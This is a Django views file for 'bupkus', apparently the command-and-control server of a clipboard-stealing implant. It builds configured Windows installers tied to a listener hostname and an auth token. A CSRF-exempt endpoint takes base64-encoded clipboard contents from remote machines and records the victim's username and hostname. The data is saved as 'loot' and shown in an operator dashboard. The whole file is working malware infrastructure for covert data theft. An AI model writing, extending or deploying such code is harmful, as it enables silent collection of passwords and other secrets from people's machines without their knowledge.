import base64
import json
import logging
import socket
import uuid

from django.contrib.auth import authenticate, login
from django.contrib.auth.decorators import login_required
from django.core import serializers
from django.http import HttpResponse, HttpResponseRedirect
from django.shortcuts import get_object_or_404, render
from django.urls import reverse
from django.utils import timezone
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_GET, require_POST, require_http_methods

from swackhammer.utils import save_loot

from .models import AuthenticationToken, ClipboardData
from .utils import configure_bupkus_installer

LOGGER = logging.getLogger("django")


@require_GET
@login_required(login_url="/signin/", redirect_field_name=None)
def index(request):
    # only show the most recent 1000 pastes
    #   (TODO: look into pagination)
    pastes = ClipboardData.objects.order_by("-paste_time")[:1000]
    return render(
        request, "bupkus/index.html", {"pastes": pastes}
    )


@require_GET
@login_required(login_url="/signin/", redirect_field_name=None)
def tokens(request):
    tokens = AuthenticationToken.objects.order_by("-last_used")
    return render(
        request, "bupkus/tokens.html", {"tokens": tokens}
    )

@require_POST
@login_required(login_url="/signin/", redirect_field_name=None)
def revoke(request, token_id):
    token = get_object_or_404(AuthenticationToken, pk=token_id)
    token.revoked = not token.revoked
    token.save()
    return HttpResponseRedirect(reverse("tokens"))


@require_http_methods(["GET", "POST"])
@login_required(login_url="/signin/", redirect_field_name=None)
def config(request):
    tokens = [str(token) for token in AuthenticationToken.objects.order_by("token").filter(revoked=False)]
    template_data = {
        "listener_name": "",
        "hostname": "",  # TODO: determine own hostname?
        "auth_tokens": tokens,
    }
    if request.method == "GET":
        return render(request, "bupkus/config.html", template_data)
    try:
        listener_name = request.POST["listener_name"]
        hostname = request.POST["hostname"]
        auth_token = request.POST["auth_token"]
    except KeyError:
        return render(request, "bupkus/config.html")
    template_data.update({k: v for k, v in request.POST.items() if k in template_data})
        
    if not all((listener_name, hostname)):
        template_data["fail_msg"] = "Missing configuration data!"
        return render(request, "bupkus/config.html", template_data, status=400)

    if not auth_token:
        auth_token = str(uuid.uuid4())
    try:
        _, _ = AuthenticationToken.objects.get_or_create(token=auth_token)
        installer = configure_bupkus_installer(
            hostname=hostname,
            auth_token=auth_token,
            listener_name=listener_name,
        )
        filename = f"bupkus_{auth_token}.exe"
        response = HttpResponse(installer, content_type="application/octet-stream")
        response["Content-Disposition"] = f"inline; filename={filename}"
        return response
    except FileNotFoundError:
        template_data["fail_msg"] = "Missing unconfigured installer!"
        return render(request, "bupkus/config.html", template_data, status=404)
    except:
        template_data["fail_msg"] = "Configuration failed!"
        return render(request, "bupkus/config.html", template_data, status=500)


@require_POST
@csrf_exempt
def paste(request):
    time_now = timezone.now()

    # grab remote hostname
    if forwarded := request.META.get("HTTP_X_FORWARDED_FOR"):
        remote_host = forwarded.split(",")[0]
    else:
        remote_host = request.META.get("REMOTE_ADDR", "")
    try:
        remote_host, _, _ = socket.gethostbyaddr(remote_host)
    except:
        pass

    # parse JSON
    try:
        req_json = json.loads(request.body)
        auth_token = req_json["auth_token"]
        username = req_json["username"]
        paste_data = base64.b64decode(req_json["paste"]).rstrip(b"\x00")
    except:
        return HttpResponse(status=400)

    # validate auth token
    try:
        token = AuthenticationToken.objects.get(token=uuid.UUID(auth_token))
    except:
        return HttpResponse(status=403)
    if token.revoked:
        return HttpResponse(status=403)
    token.last_hostname = remote_host
    token.last_used = time_now
    token.save()

    # save paste data
    try:
        uri = save_loot("paste", paste_data, "bupkus/")
        ClipboardData.objects.create(
            username=username,
            hostname=remote_host,
            paste_time=time_now,
            paste_size=len(paste_data),
            file_path=uri,
        )
    except:
        return HttpResponse(status=500)

    return HttpResponse(status=200)
